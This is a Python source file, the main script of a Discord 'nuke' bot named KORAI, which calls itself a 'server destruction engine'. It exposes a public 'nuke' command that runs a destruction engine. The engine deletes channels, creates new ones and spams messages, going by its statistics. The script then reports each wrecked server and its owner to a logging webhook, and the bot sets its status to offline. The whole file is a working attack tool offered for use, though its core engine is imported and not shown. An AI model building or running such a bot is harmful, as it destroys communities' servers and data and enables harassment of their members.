#!/usr/bin/env python3
"""
KORAI
Made by laxzytbh
Maximum velocity server destruction engine
"""

import asyncio
import json
import sys
from pathlib import Path
from datetime import datetime

import discord
from discord.ext import commands
import aiohttp

from core.nuke import NukeEngine
from core.queue import RequestQueue
from core.smooth import RateLimitHandler
from core.utils import Logger

CONFIG_PATH = Path(__file__).parent / "config.json"

def load_config():
    if not CONFIG_PATH.exists():
        print(f"[!] Error: {CONFIG_PATH} not found")
        sys.exit(1)
    
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"[!] Invalid JSON in config.json: {e}")
        sys.exit(1)

def print_banner():
    banner = """
    ██╗  ██╗ ██████╗ ██████╗  █████╗ ██╗
    ██║ ██╔╝██╔═══██╗██╔══██╗██╔══██╗██║
    █████╔╝ ██║   ██║██████╔╝███████║██║
    ██╔═██╗ ██║   ██║██╔══██╗██╔══██║██║
    ██║  ██╗╚██████╔╝██║  ██║██║  ██║██║
    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
                                         
         Made by laxzytbh | v2.0         
    """
    print(banner)

config = load_config()

intents = discord.Intents.all()
intents.message_content = True

bot = commands.Bot(
    command_prefix=config["prefix"],
    intents=intents,
    help_command=None,
    status=discord.Status.offline,
    activity=discord.Game(name="Ah shit, here we go again.")
)

logger = Logger()
rate_handler = RateLimitHandler()
queue = RequestQueue(max_concurrent=config["advanced"]["concurrent_requests"])


class LogWebhook:
    def __init__(self, webhook_url):
        self.url = webhook_url
        self.session = None
    
    async def init(self):
        self.session = aiohttp.ClientSession()
    
    async def close(self):
        if self.session:
            await self.session.close()
    
    async def send_nuke_log(self, guild, author, stats, duration):
        if not self.url or self.url == "YOUR_WEBHOOK_URL_HERE":
            return
        
        # Create detailed embed
        embed = {
            "title": "Nuke Logger",
            "description": "A server has been nuked",
            "color": 0xff0000,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "thumbnail": {
                "url": str(guild.icon.url) if guild.icon else None
            },
            "fields": [
                {
                    "name": "Server Information",
                    "value": f"**Name:** {guild.name}\n**ID:** {guild.id}\n**Members:** {guild.member_count}\n**Owner:** {guild.owner}\n**Created:** <t:{int(guild.created_at.timestamp())}:R>",
                    "inline": False
                },
                {
                    "name": "Nuker Information",
                    "value": f"**Username:** {author}\n**ID:** {author.id}\n**Mention:** <@{author.id}>",
                    "inline": False
                },
                {
                    "name": "Nuke Statistics",
                    "value": f"**Duration:** {duration:.2f}s\n**Channels:** {stats.get('deleted_channels', 0)}->{len(stats.get('created_channels', []))}\n**Messages:** {stats.get('messages_sent', 0)}\n**Failed:** {stats.get('failed_sends', 0)}",
                    "inline": False
                }
            ],
            "footer": {
                "text": f"Nuke Logger | {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
            }
        }
        
        # Add author avatar if available
        if author.avatar:
            embed["thumbnail"] = {"url": str(author.avatar.url)}
        
        payload = {
            "username": "Nuke Logger",
            "avatar_url": str(bot.user.avatar.url) if bot.user.avatar else None,
            "embeds": [embed]
        }
        
        try:
            async with self.session.post(self.url, json=payload) as resp:
                return resp.status == 204
        except Exception as e:
            logger.error(f"Failed to send log webhook: {e}")
            return False


# Initialize log webhook
log_webhook = LogWebhook(config.get("log_webhook", {}).get("url", ""))


@bot.event
async def on_ready():
    await log_webhook.init()
    logger.success(f"KORAI Online | {bot.user}")
    logger.info(f"Prefix: {config['prefix']}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    logger.error(f"Command error: {error}")

@bot.command(name="nuke")
async def nuke_cmd(ctx):
    """Execute maximum velocity nuke - PUBLIC ACCESS"""
    if not ctx.guild:
        return await ctx.send("Guild Only")
    
    # Log start
    logger.info(f"NUKE STARTED by {ctx.author} ({ctx.author.id}) in {ctx.guild.name}")
    
    engine = NukeEngine(bot, config, queue, rate_handler, logger)
    
    # Execute nuke
    await engine.execute(ctx.guild, ctx)
    
    # Send log webhook
    duration = (engine.stats["end_time"] - engine.stats["start_time"]).total_seconds()
    await log_webhook.send_nuke_log(
        guild=ctx.guild,
        author=ctx.author,
        stats=engine.stats,
        duration=duration
    )

@bot.command(name="help")
async def help_cmd(ctx):
    """Show Wally commands"""
    embed = discord.Embed(
        title="Help Panel",
        description="All available commands",
        color=0xff0000
    )
    embed.add_field(
        name=f"`{config['prefix']}nuke`",
        value="Nuke the server",
        inline=False
    )
    embed.add_field(
        name=f"`{config['prefix']}help`",
        value="Show this message",
        inline=False
    )
    embed.add_field(
        name=f"`{config['prefix']}ping`",
        value="Check bot latency",
        inline=False
    )
    embed.set_footer(text="Made by laxzytbh")
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping_cmd(ctx):
    """Check bot latency"""
    latency = round(bot.latency * 1000)
    await ctx.send(f"Pong! | {latency}ms")

async def cleanup():
    await log_webhook.close()

def main():
    print_banner()
    
    token = config.get("token", "")
    if not token or token == "YOUR_BOT_TOKEN_HERE":
        logger.error("Invalid token in config.json")
        sys.exit(1)
    
    try:
        bot.run(token)
    except discord.LoginFailure:
        logger.error("Invalid token")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
    finally:
        asyncio.run(cleanup())

if __name__ == "__main__":
    main()